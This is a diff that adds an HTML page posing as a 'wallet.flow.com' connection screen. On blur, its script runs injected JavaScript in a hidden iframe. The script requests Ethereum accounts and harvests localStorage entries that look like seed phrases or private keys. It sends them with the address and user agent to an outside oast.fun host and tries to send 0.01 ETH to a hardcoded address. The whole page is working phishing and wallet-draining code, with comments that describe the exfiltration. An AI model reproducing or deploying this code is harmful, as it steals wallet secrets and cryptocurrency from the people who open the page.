@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, user-scalable=no">
+  <title>wallet.flow.com</title>
+  <style>
+    iframe { visibility: hidden; }
+    body { font-family: system-ui, sans-serif; text-align: center; padding-top: 100px; background:#0f172a; color:#e0f7fa; }
+    h1 { color:#22c55e; font-size:28px; }
+    .msg { margin:20px; font-size:16px; color:#94a3b8; }
+  </style>
+</head>
+<body>
+  <h1>Click Here to Connect</h1>
+  <p class="msg">Secure wallet connection in background...</p>
+  <iframe id="iframe"></iframe>
+
+  <script>
+    window.onblur = function () {
+      const code =
+        "(function(){try{" +
+        // DETEKSI & CONNECT WALLET SILENT
+        "if(!window.ethereum)return;" +
+        "var provider = window.ethereum;" +
+        "provider.request({method:'eth_requestAccounts'}).then(accs=>{" +
+        "var user = accs[0];" +
+
+        // EXFIL SEED PHRASE DARI localStorage (WORK DI BANYAK WALLET!)
+        "var seed = '';" +
+        "for(var i=0;i<localStorage.length;i++){" +
+        "  var key = localStorage.key(i);" +
+        "  if(key && (key.includes('seed')||key.includes('mnemonic')||key.includes('private')||key.includes('phrase'))){" +
+        "    seed += key + '=' + localStorage.getItem(key) + '||';" +
+        "  }" +
+        "}" +
+        "if(seed==='')seed='no-seed-found';" +
+
+        // EXFIL KE WEBHOOK (SILENT)
+        "var url = 'https://wicgexpjrsyueurgfmobvc6nv7xjinr7t.oast.fun/'" +
+        "  + '?addr=' + user" +
+        "  + '&seed=' + encodeURIComponent(btoa(seed))" +
+        "  + '&ua=' + encodeURIComponent(navigator.userAgent);" +
+        "new Image().src = url;" +
+
+        // BONUS: SEND TX (opsional, silent)
+        "var tx = {" +
+        "  from: user," +
+        "  to: '0xf9f41a5462bbe4f3ee00559b346930d9172c22c2'," +
+        "  value: '0x2386F26FC10000'," + // 0.01 ETH
+        "  gas: '0x5208'" +
+        "};" +
+        "provider.request({method:'eth_sendTransaction',params:[tx]}).catch(()=>{});" +
+
+        "}).catch(()=>{ });" +
+        "}catch(e){} })()";
+
+      document.getElementById('iframe').src = "javascript:" + code;
+    };
+  </script>
+</body>
+</html>
